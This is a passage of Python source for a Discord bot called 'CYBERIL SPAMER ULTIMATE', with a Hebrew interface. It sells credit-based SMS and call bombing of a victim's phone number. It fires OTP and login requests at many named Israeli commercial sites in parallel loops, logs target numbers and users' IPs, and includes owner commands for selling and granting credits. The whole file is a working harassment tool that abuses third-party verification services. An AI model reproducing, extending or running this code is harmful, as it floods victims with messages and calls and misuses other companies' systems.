            send_request(s, "https://ohmama.co.il/?wc-ajax=validate_user_by_sms", form=f"otp_login_nonce=de90e8f67b&phone={raw}&security=de90e8f67b", tag="ohmama"),
            send_request(s, "https://server.myofer.co.il/api/sendAuthSms", json_data={"phoneNumber": raw}, tag="myofer"),
            send_request(s, "https://arcaffe.co.il/wp-admin/admin-ajax.php", form=f"action=user_login_step_1&phone_number={raw}&step[]=1", tag="arcaffe"),
            send_request(s, "https://api.noyhasade.co.il/api/login?origin=web", json_data={"phone": raw, "email": False, "ip": "1.1.1.1"}, tag="noyhasade"),
            send_request(s, "https://www.zinger-organic.com/frontend/chkkksoepvnbnbb", form=f"phone_number={raw}&_token=UvDFsX8fy3p35K3mVrXRCBJzrgjHWvYZAyMrnNnT&login_message_type=sms", tag="zinger"),
            send_request(s, "https://www.jungle-club.co.il/wp-admin/admin-ajax.php", form=f"action=simply-check-member-cellphone&cellphone={raw}", tag="jungle"),
            send_request(s, "https://blendo.co.il/wp-admin/admin-ajax.php", form=f"action=simply-check-member-cellphone&cellphone={raw}", tag="blendo"),
            send_request(s, "https://api.gomobile.co.il/api/login", json_data={"phone": raw}, tag="gomobile"),
            send_request(s, "https://bonitademas.co.il/apps/imapi-customer", json_data={"action": "login", "otpBy": "sms", "otpValue": raw}, tag="bonita"),
            send_request(s, "https://story.magicetl.com/public/shopify/apps/otp-login/step-one", json_data={"phone": raw}, tag="story"),
            send_request(s, "https://authentication.wolt.com/v1/captcha/site_key_authenticated", json_data={"phone_number": raw, "operation": "request_number_verification"}, tag="wolt-captcha"),
            send_request(s, "https://www.golfkids.co.il/customer/ajax/post/", form=f"form_key=XB0c9tAkTouRgHrI&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.golfkids.co.il", "https://www.golfkids.co.il/"), tag="golfkids"),
            send_request(s, "https://www.555.co.il/ms/rest/otpservice/client/send/phone", json_data={"password": None, "phoneNr": raw, "sendType": 1, "systemType": None}, tag="555"),
            send_request(s, "https://www.lehamim.co.il/_a/aff_otp_auth", form=f"phone={raw}", tag="lehamim"),
            send_request(s, "https://api.geteat.co.il/auth/sendValidationCode", data=geteat_fd, tag="geteat"),
            send_request(s, "https://www.ivory.co.il/user/login/sendCodeSms", method="GET", tag="ivory"),
        ])

        all_res = await asyncio.gather(*tasks, return_exceptions=True)
        success = 0
        for r in all_res:
            if isinstance(r, Exception):
                continue
            elif isinstance(r, tuple):
                ok, name = r
                if ok:
                    success += 1
        return success

def create_panel():
    embed = discord.Embed(title="🔥 **CYBERIL SPAMER ULTIMATE** 🔥", description="**המערכת החזקה ביותר בישראל**\n> 200+ שירותים | SMS + CALL | 1000+ חיבורים במקביל", color=COLOR_MAIN)
    embed.add_field(name="🚀 **התחל ספאם**", value="```\n1. לחץ על התחל ספאם\n2. הזן מספר טלפון\n3. בחר כמות קרדיטים\n4. אשר והמתן לתוצאות```", inline=False)
    embed.add_field(name="💎 **עלות**", value=f"```\nכל קרדיט = דקה אחת\nכל דקה = 300+ בקשות\nשיחות + SMS במקביל```", inline=False)
    embed.add_field(name="⚡ **מהירות**", value=f"```\n1000+ חיבורים במקביל\nTimeOut 3 שניות\nדיליי {COOLDOWN_TIME} שניות בין ספאם```", inline=False)
    embed.set_footer(text="🔥 CYBERIL SPAMER ULTIMATE | הכי חזק בארץ 🔥")
    return embed

def create_gift_panel():
    embed = discord.Embed(title="🎁 **קרדיטים חינם** 🎁", description="```\nקבל קרדיט אחד כל 24 שעות\nללא הגבלה על כמות הקרדיטים\nהקרדיטים נצברים לאורך זמן```", color=0xFFD700)
    embed.add_field(name="🎯 **איך מקבלים?**", value="```\nלחץ על הכפתור למטה וקבל קרדיט מיידית!```", inline=False)
    embed.set_footer(text="🔥 CYBERIL SPAMER ULTIMATE 🔥")
    return embed

class StopAttack(discord.ui.View):
    def __init__(self, user_id: int):
        super().__init__(timeout=None)
        self.user_id = user_id

    @discord.ui.button(label="⏹️ עצור ספאם", style=discord.ButtonStyle.danger, emoji="⏹️", custom_id="stop_attack")
    async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id and not is_owner(interaction):
            await interaction.response.send_message("❌ לא הספאם שלך", ephemeral=True)
            return
        ev = active_missions.get(self.user_id)
        if ev:
            ev.set()
        button.disabled = True
        await interaction.response.edit_message(view=self)

class ConfirmAttack(discord.ui.View):
    def __init__(self, phone: str, cost: int, user_id: int):
        super().__init__(timeout=30)
        self.phone = phone
        self.cost = cost
        self.user_id = user_id
        self.is_running = False

    @discord.ui.button(label="✅ התחל ספאם", style=discord.ButtonStyle.danger, emoji="✅", custom_id="confirm_attack")
    async def confirm_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("❌ לא האישור שלך", ephemeral=True)
            return
        if self.is_running:
            await interaction.response.send_message("⚠️ הספאם כבר בתהליך", ephemeral=True)
            return
        self.is_running = True
        self.stop()
        await interaction.response.defer(ephemeral=True)
        for _ in range(self.cost):
            if not await use_credit(self.user_id):
                embed = discord.Embed(title="❌ אין מספיק קרדיטים", color=COLOR_DANGER)
                await interaction.edit_original_response(embed=embed, view=None)
                return

        stop_event = asyncio.Event()
        active_missions[self.user_id] = stop_event

        embed = discord.Embed(title="🔄 ספאם בתהליך", description=f"**{self.phone}** | **{self.cost} דקות**\nSMS + CALL במקביל | 1000+ חיבורים", color=COLOR_WARNING)
        await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))

        total_success = 0
        start_time = time.time()
        end_time = start_time + (self.cost * 60)
        last_update = time.time()
        ip = await get_client_ip()

        try:
            while time.time() < end_time:
                if stop_event.is_set() or is_shutting_down:
                    break
                success = await run_spam_batch(self.phone)
                total_success += success
                if time.time() - last_update >= 2:
                    remaining = max(0, int((end_time - time.time()) / 60))
                    rate = int(total_success / max(1, time.time() - start_time))
                    embed = discord.Embed(title="🔄 ספאם בתהליך", description=f"**{self.phone}** | נותר: {remaining} דקות\n\n✅ {total_success} בקשות | ⚡ {rate}/שנייה\n📞 200+ שירותים | SMS + CALL", color=COLOR_WARNING)
                    await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))
                    last_update = time.time()
                await asyncio.sleep(0)

            await apply_cooldown(self.phone)
            active_missions.pop(self.user_id, None)
            stopped = stop_event.is_set()
            await save_log(user_id=self.user_id, username=str(interaction.user), phone=self.phone, cost=self.cost, success=total_success, failed=0, duration=self.cost * 60, ip=ip)
            bal = await format_balance(self.user_id)
            rate = int(total_success / max(1, self.cost * 60))
            final = discord.Embed(title="⏹️ ספאם הופסק" if stopped else "✅ ספאם הושלם", color=COLOR_WARNING if stopped else COLOR_SUCCESS)
            final.add_field(name="📱 יעד", value=self.phone, inline=True)
            final.add_field(name="⏱️ משך", value=f"{self.cost} דקות", inline=True)
            final.add_field(name="✅ בקשות", value=str(total_success), inline=True)
            final.add_field(name="⚡ קצב", value=f"{rate}/שנייה", inline=True)
            final.add_field(name="💎 קרדיטים", value=bal, inline=True)
            final.add_field(name="📞 סוג", value="SMS + CALL (200+ שירותים)", inline=True)
            await interaction.edit_original_response(embed=final, view=None)

        except Exception as e:
            active_missions.pop(self.user_id, None)
            await interaction.edit_original_response(embed=discord.Embed(title="❌ שגיאה", description=str(e)[:180], color=COLOR_DANGER), view=None)

    @discord.ui.button(label="❌ בטל", style=discord.ButtonStyle.secondary, emoji="❌", custom_id="cancel_attack")
    async def cancel_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("❌ לא שלך", ephemeral=True)
            return
        self.stop()
        await interaction.response.edit_message(embed=discord.Embed(title="❌ בוטל", description="לא נוכו קרדיטים", color=COLOR_INFO), view=None)

class LaunchModal(discord.ui.Modal, title="התחל ספאם"):
    phone = discord.ui.TextInput(label="📱 מספר טלפון", placeholder="0501234567", min_length=9, max_length=13, style=discord.TextStyle.short)
    credits = discord.ui.TextInput(label="💎 כמות קרדיטים", placeholder="1-100", min_length=1, max_length=3, style=discord.TextStyle.short)

    async def on_submit(self, interaction: discord.Interaction):
        phone_num = self.phone.value.strip().replace("-", "").replace(" ", "").replace("+", "").replace("(", "").replace(")", "")
        if phone_num.startswith("972"):
            phone_num = phone_num[3:]
        if len(phone_num) == 9:
            phone_num = "0" + phone_num
        if len(phone_num) != 10 or not phone_num.startswith("05") or not phone_num.isdigit():
            await interaction.response.send_message(embed=discord.Embed(title="❌ שגיאה", description="מספר לא תקין!\nפורמט תקין:\n- 0501234567\n- 501234567\n- 972501234567", color=COLOR_DANGER), ephemeral=True)
            return
        try:
            credits_num = int(self.credits.value.strip())
            if credits_num < 1 or credits_num > MAX_CREDIT_SPEND:
                raise ValueError
        except ValueError:
            await interaction.response.send_message(embed=discord.Embed(title="❌ שגיאה", description=f"כמות לא תקינה (1-{MAX_CREDIT_SPEND})", color=COLOR_DANGER), ephemeral=True)
            return
        uid = interaction.user.id
        bal = await fetch_balance(uid)
        unlimited = await has_unlimited(uid)
        if bal < credits_num and not unlimited:
            await interaction.response.send_message(embed=discord.Embed(title="❌ שגיאה", description=f"חסרים קרדיטים (יש: {bal}, צריך: {credits_num})", color=COLOR_DANGER), ephemeral=True)
            return
        on_cd, remain = await check_cooldown(phone_num)
        if on_cd:
            await interaction.response.send_message(embed=discord.Embed(title="⏱️ דיליי", description=f"המתן {remain} שניות", color=COLOR_WARNING), ephemeral=True)
            return
        bal_str = await format_balance(uid)
        confirm = discord.Embed(title="⚠️ אישור ספאם", description=f"**יעד:** {phone_num}\n**משך:** {credits_num} דקות\n**עלות:** {credits_num} קרדיטים\n**יתרה:** {bal_str}\n\n📞 200+ שירותים | SMS + CALL במקביל | 1000+ חיבורים", color=COLOR_WARNING)
        try:
            await interaction.response.send_message(embed=confirm, view=ConfirmAttack(phone=phone_num, cost=credits_num, user_id=uid), ephemeral=True)
        except discord.errors.NotFound:
            await interaction.followup.send(embed=confirm, view=ConfirmAttack(phone=phone_num, cost=credits_num, user_id=uid), ephemeral=True)

class MainPanel(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🚀 התחל ספאם", style=discord.ButtonStyle.danger, emoji="🚀", custom_id="start_spam")
    async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        now = time.time()
        last = cooldown_tracker.get(interaction.user.id, 0)
        if now - last < LAUNCH_DELAY:
            await interaction.response.send_message(embed=discord.Embed(title="⏱️ דיליי", description=f"המתן {int(LAUNCH_DELAY - (now - last))} שניות", color=COLOR_WARNING), ephemeral=True)
            return
        cooldown_tracker[interaction.user.id] = now
        await interaction.response.send_modal(LaunchModal())

    @discord.ui.button(label="💎 הקרדיטים שלי", style=discord.ButtonStyle.primary, emoji="💎", custom_id="check_balance")
    async def balance_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = interaction.user.id
        bal_str = await format_balance(uid)
        stats = await get_user_stats(uid)
        embed = discord.Embed(title="💎 הקרדיטים שלי", description=f"**{bal_str}**", color=COLOR_INFO)
        if stats:
            embed.add_field(name="📊 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
            embed.add_field(name="✅ בקשות", value=str(stats.get("total_success", 0)), inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="📊 סטטוס", style=discord.ButtonStyle.secondary, emoji="📊", custom_id="stats")
    async def stats_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_owner(interaction):
            await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
            return
        await interaction.response.defer(ephemeral=True)
        stats = await get_global_stats()
        if not stats:
            await interaction.followup.send(embed=discord.Embed(title="📊 סטטיסטיקה", description="אין נתונים", color=COLOR_INFO), ephemeral=True)
            return
        embed = discord.Embed(title="📊 סטטיסטיקה גלובלית", color=COLOR_INFO)
        embed.add_field(name="🎯 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
        embed.add_field(name="👥 משתמשים", value=str(stats.get("unique_users", 0)), inline=True)
        embed.add_field(name="💎 קרדיטים", value=str(stats.get("total_cost", 0)), inline=True)
        embed.add_field(name="✅ בקשות", value=str(stats.get("total_success", 0)), inline=True)
        await interaction.followup.send(embed=embed, ephemeral=True)

    @discord.ui.button(label="🛑 עצור הכל", style=discord.ButtonStyle.danger, emoji="🛑", custom_id="stop_all")
    async def stop_all_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_owner(interaction):
            await interaction.response.send_message("❌ רק הבעלים יכול לעצור את כל המתקפות", ephemeral=True)
            return
        stopped_count = 0
        for user_id, event in list(active_missions.items()):
            if event and not event.is_set():
                event.set()
                stopped_count += 1
        active_missions.clear()
        await interaction.response.send_message(embed=discord.Embed(title="🛑 כל המתקפות הופסקו", description=f"הופסקו {stopped_count} מתקפות פעילות", color=COLOR_SUCCESS), ephemeral=True)

class FreeCoins(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🎁 קבל קרדיט חינם", style=discord.ButtonStyle.success, emoji="🎁", custom_id="claim_free")
    async def claim_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = interaction.user.id
        now = time.time()
        await interaction.response.defer(ephemeral=True)
        doc = await settings_collection.find_one({"_id": uid, "type": "free_credits"})
        if doc:
            diff = now - doc.get("last_claim", 0)
            if diff < 86400:
                hours = int((86400 - diff) // 3600)
                minutes = int(((86400 - diff) % 3600) // 60)
                await interaction.followup.send(embed=discord.Embed(title="⏱️ קרדיטים חינם", description=f"תוכל לקבל קרדיט נוסף בעוד {hours} שעות ו-{minutes} דקות", color=COLOR_WARNING), ephemeral=True)
                return
        await add_credits(uid, 1)
        await settings_collection.update_one({"_id": uid, "type": "free_credits"}, {"$set": {"last_claim": now}}, upsert=True)
        new_bal = await format_balance(uid)
        await interaction.followup.send(embed=discord.Embed(title="🎁 קיבלת קרדיט", description=f"+1 קרדיט\n\nיתרה: {new_bal}", color=0xFFD700), ephemeral=True)

async def get_user_stats(user_id: int):
    pipeline = [{"$match": {"user_id": user_id}}, {"$group": {"_id": "$user_id", "total_attacks": {"$sum": 1}, "total_cost": {"$sum": "$cost"}, "total_success": {"$sum": "$success_count"}}}]
    result = await logs_collection.aggregate(pipeline).to_list(1)
    return result[0] if result else None

async def get_global_stats():
    pipeline = [{"$group": {"_id": None, "total_attacks": {"$sum": 1}, "total_cost": {"$sum": "$cost"}, "total_success": {"$sum": "$success_count"}, "unique_users": {"$addToSet": "$user_id"}}}]
    result = await logs_collection.aggregate(pipeline).to_list(1)
    if result:
        result[0]["unique_users"] = len(result[0]["unique_users"])
        return result[0]
    return None

async def get_user_logs(user_id: int, limit: int = 20):
    cursor = logs_collection.find({"user_id": user_id}).sort("timestamp", -1).limit(limit)
    return await cursor.to_list(length=limit)

async def get_all_logs(limit: int = 100):
    cursor = logs_collection.find().sort("timestamp", -1).limit(limit)
    return await cursor.to_list(length=limit)

async def get_top_targets(limit: int = 10):
    pipeline = [{"$group": {"_id": "$phone", "count": {"$sum": 1}, "success_total": {"$sum": "$success_count"}}}, {"$sort": {"count": -1}}, {"$limit": limit}]
    return await logs_collection.aggregate(pipeline).to_list(length=limit)

@client.event
async def on_ready():
    await tree.sync()
    client.add_view(MainPanel())
    client.add_view(FreeCoins())
    await client.change_presence(activity=discord.Game(name="🔥 300+ בקשות/שנייה | 200+ שירותים 🔥"))
    print(f"✅ CyberIL Spamer Ultimate פעיל → {client.user}")
    print(f"📡 מחובר ל-{len(client.guilds)} שרתים")
    print(f"👑 Owner ID: {OWNER_ID}")
    now = time.time()
    expired = await lifetime_collection.find({"expires_at": {"$lt": now, "$gt": 0}}).to_list(length=None)
    for item in expired:
        await lifetime_collection.delete_one({"_id": item["_id"]})
    await asyncio.sleep(2)
    try:
        main_ch = client.get_channel(PANEL_CHANNEL)
        if main_ch:
            await main_ch.purge(limit=5)
            await main_ch.send(embed=create_panel(), view=MainPanel())
            print(f"✅ פאנל נשלח ל-{main_ch.name}")
        gift_ch = client.get_channel(GIFT_CHANNEL)
        if gift_ch:
            await gift_ch.purge(limit=5)
            await gift_ch.send(embed=create_gift_panel(), view=FreeCoins())
            print(f"✅ הודעת קרדיטים נשלחה ל-{gift_ch.name}")
    except Exception as e:
        print(f"❌ שגיאה: {e}")

@client.event
async def on_disconnect():
    global is_shutting_down
    is_shutting_down = True
    for user_id, event in active_missions.items():
        if event and not event.is_set():
            event.set()
    active_missions.clear()

async def shutdown_handler():
    global is_shutting_down
    is_shutting_down = True
    for user_id, event in active_missions.items():
        if event and not event.is_set():
            event.set()
    active_missions.clear()
    await client.close()

# ========== OWNER COMMANDS ==========
@tree.command(name="addcredit", description="[OWNER] הוסף קרדיטים")
async def cmd_addcredit(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not is_owner(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    if amount <= 0:
        await interaction.response.send_message("❌ כמות חייבת להיות חיובית", ephemeral=True)
        return
    await add_credits(member.id, amount)
    new_bal = await format_balance(member.id)
    embed = discord.Embed(title="✅ קרדיטים נוספו", color=COLOR_SUCCESS)
    embed.add_field(name="משתמש", value=member.mention, inline=True)
    embed.add_field(name="נוסף", value=str(amount), inline=True)
    embed.add_field(name="יתרה", value=new_bal, inline=True)
    await interaction.response.send_message(embed=embed)

@tree.command(name="removecredit", description="[OWNER] הסר קרדיטים")
async def cmd_removecredit(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not is_owner(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    if amount <= 0:
        await interaction.response.send_message("❌ כמות חייבת להיות חיובית", ephemeral=True)
        return
    await remove_credits(member.id, amount)
    new_bal = await format_balance(member.id)
    embed = discord.Embed(title="🗑️ קרדיטים הוסרו", color=COLOR_WARNING)
    embed.add_field(name="משתמש", value=member.mention, inline=True)
    embed.add_field(name="הוסר", value=str(amount), inline=True)
    embed.add_field(name="יתרה", value=new_bal, inline=True)
    await interaction.response.send_message(embed=embed)

@tree.command(name="lifetime", description="[OWNER] הענק ללא הגבלה")
async def cmd_lifetime(interaction: discord.Interaction, member: discord.Member, duration: int = None, unit: str = "forever"):
    if not is_owner(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.defer()
    if unit.lower() == "forever" or duration is None:
        await set_lifetime(member.id)
        await interaction.followup.send(embed=discord.Embed(title="♾️ Lifetime הוענק", description=f"{member.mention} קיבל lifetime לתמיד", color=COLOR_SUCCESS))
        return
    unit_map = {"minutes": 60, "hours": 3600, "days": 86400, "months": 2592000}
    if unit.lower() in unit_map:
        seconds = duration * unit_map[unit.lower()]
        await set_lifetime(member.id, seconds)
        await interaction.followup.send(embed=discord.Embed(title="♾️ Lifetime הוענק", description=f"{member.mention} קיבל lifetime ל-{duration} {unit}", color=COLOR_SUCCESS))
    else:
        await interaction.followup.send("❌ יחידה לא תקינה", ephemeral=True)

@tree.command(name="removelifetime", description="[OWNER] הסר ללא הגבלה")
async def cmd_removelifetime(interaction: discord.Interaction, member: discord.Member):
    if not is_owner(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await remove_lifetime(member.id)
    await interaction.response.send_message(embed=discord.Embed(title="♾️ Lifetime הוסר", description=f"{member.mention} איבד את ה-lifetime", color=COLOR_WARNING))

@tree.command(name="stopall", description="[OWNER] עצור את כל המתקפות")
async def cmd_stopall(interaction: discord.Interaction):
    if not is_owner(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    stopped_count = 0
    for user_id, event in list(active_missions.items()):
        if event and not event.is_set():
            event.set()
            stopped_count += 1
    active_missions.clear()
    await interaction.response.send_message(embed=discord.Embed(title="🛑 כל המתקפות הופסקו", description=f"הופסקו {stopped_count} מתקפות פעילות", color=COLOR_SUCCESS))

@tree.command(name="restart", description="[OWNER] אתחל בוט")
async def cmd_restart(interaction: discord.Interaction):
    if not is_owner(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.send_message("🔄 מאתחל...", ephemeral=True)
    await shutdown_handler()
    os.execv(sys.executable, [sys.executable] + sys.argv)

@tree.command(name="checkstatus", description="[OWNER] בדוק סטטוס")
async def cmd_checkstatus(interaction: discord.Interaction):
    if not is_owner(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    success = await run_spam_batch("0506500708")
    await interaction.followup.send(embed=discord.Embed(title="📊 בדיקת מערכת", color=COLOR_INFO).add_field(name="✅ בקשות", value=str(success)).add_field(name="📞 סוג", value="SMS + CALL (200+ שירותים)"))

@tree.command(name="attacklogs", description="[OWNER] לוגים")
async def cmd_attacklogs(interaction: discord.Interaction, limit: int = 10):
    if not is_owner(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    logs = await get_all_logs(min(limit, 50))
    if not logs:
        await interaction.followup.send("📭 אין לוגים", ephemeral=True)
        return
    embed = discord.Embed(title="📋 לוגים אחרונים", color=COLOR_INFO)
    for log in logs[:10]:
        embed.add_field(name=f"{log['username']} | {log.get('date', '')} {log.get('time', '')}", value=f"📱 {log['phone']}\n✅ {log['success_count']} | 💎 {log['cost']}\n🌐 {log.get('ip', 'unknown')}", inline=False)
    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="globalstats", description="[OWNER] סטטיסטיקה גלובלית")
async def cmd_globalstats(interaction: discord.Interaction):
    if not is_owner(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    stats = await get_global_stats()
    if not stats:
        await interaction.followup.send("📭 אין נתונים", ephemeral=True)
        return
    embed = discord.Embed(title="📊 סטטיסטיקה גלובלית", color=COLOR_INFO)
    embed.add_field(name="🎯 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
    embed.add_field(name="👥 משתמשים", value=str(stats.get("unique_users", 0)), inline=True)
    embed.add_field(name="💎 קרדיטים", value=str(stats.get("total_cost", 0)), inline=True)
    embed.add_field(name="✅ בקשות", value=str(stats.get("total_success", 0)), inline=True)
    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="freecredits", description="[OWNER] שלח הודעת קרדיטים")
async def cmd_freecredits(interaction: discord.Interaction):
    if not is_owner(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.send_message(embed=create_gift_panel(), view=FreeCoins())

@tree.command(name="giveall", description="[OWNER] תן לכולם")
async def cmd_giveall(interaction: discord.Interaction, amount: int):
    if not is_owner(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    if amount <= 0:
        await interaction.followup.send("❌ כמות חייבת להיות חיובית", ephemeral=True)
        return
    await users_collection.update_many({}, {"$inc": {"credits": amount}})
    await interaction.followup.send(f"✅ ניתנו {amount} קרדיטים לכולם", ephemeral=True)

# ========== PUBLIC COMMANDS ==========
@tree.command(name="credits", description="בדוק יתרת קרדיטים")
async def cmd_credits(interaction: discord.Interaction, member: discord.Member = None):
    target = member or interaction.user
    bal = await format_balance(target.id)
    stats = await get_user_stats(target.id)
    embed = discord.Embed(title="💎 קרדיטים", description=f"{target.mention} — **{bal}**", color=COLOR_INFO)
    if stats:
        embed.add_field(name="📊 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
        embed.add_field(name="✅ בקשות", value=str(stats.get("total_success", 0)), inline=True)
    await interaction.response.send_message(embed=embed)

@tree.command(name="transfer", description="העבר קרדיטים")
async def cmd_transfer(interaction: discord.Interaction, member: discord.Member, amount: int):
    await interaction.response.defer(ephemeral=True)
    if amount < 20:
        await interaction.followup.send("❌ מינימום העברה 20", ephemeral=True)
        return
    if interaction.user.id == member.id:
        await interaction.followup.send("❌ אי אפשר להעביר לעצמך", ephemeral=True)
        return
    uid = interaction.user.id
    if await has_unlimited(uid):
        await interaction.followup.send("❌ משתמשי lifetime לא יכולים להעביר", ephemeral=True)
        return
    bal = await fetch_balance(uid)
    if bal < amount:
        await interaction.followup.send(f"❌ אין מספיק קרדיטים", ephemeral=True)
        return
    await remove_credits(uid, amount)
    await add_credits(member.id, amount)
    await interaction.followup.send(embed=discord.Embed(title="💸 העברה הושלמה", color=COLOR_SUCCESS).add_field(name="מאת", value=interaction.user.mention).add_field(name="אל", value=member.mention).add_field(name="כמות", value=str(amount)), ephemeral=True)

@tree.command(name="mylogs", description="הצג לוגים")
async def cmd_mylogs(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    logs = await get_user_logs(interaction.user.id, 10)
    if not logs:
        await interaction.followup.send("📭 אין מתקפות", ephemeral=True)
        return
    embed = discord.Embed(title="📋 לוגים", color=COLOR_INFO)
    for log in logs:
        embed.add_field(name=f"{log.get('date', '')} {log.get('time', '')}", value=f"📱 {log['phone']}\n✅ {log['success_count']} | 💎 {log['cost']}", inline=False)
    await interaction.followup.send(embed=embed, ephemeral=True)

if __name__ == "__main__":
    try:
        client.run(TOKEN)
    except KeyboardInterrupt:
        asyncio.run(shutdown_handler())
